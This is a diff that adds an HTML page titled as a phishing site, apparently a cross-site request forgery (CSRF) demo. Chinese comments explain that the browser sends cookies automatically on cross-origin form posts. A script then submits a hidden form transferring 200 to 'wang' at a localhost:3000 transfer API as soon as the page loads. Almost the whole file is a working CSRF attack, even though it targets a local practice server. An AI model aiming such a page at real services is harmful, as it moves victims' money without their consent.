@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>钓鱼导向的网站</title>
+</head>
+<body>
+   <!-- 第三方网站 其实是拿不到用户cookie的 当往3000端口提交内容时自动会提交cookie -->
+   <!-- 表单没有跨域，ajax才有跨域 -->
+
+  <form name="myForm" action="http://localhost:3000/api/transfer" method="post">
+    <input type="text" name="target" value="wang">
+    <input type="text" name="money" value="200">
+  </form>
+
+  <script>
+    document.myForm.submit();
+  </script>
+</body>
+</html>
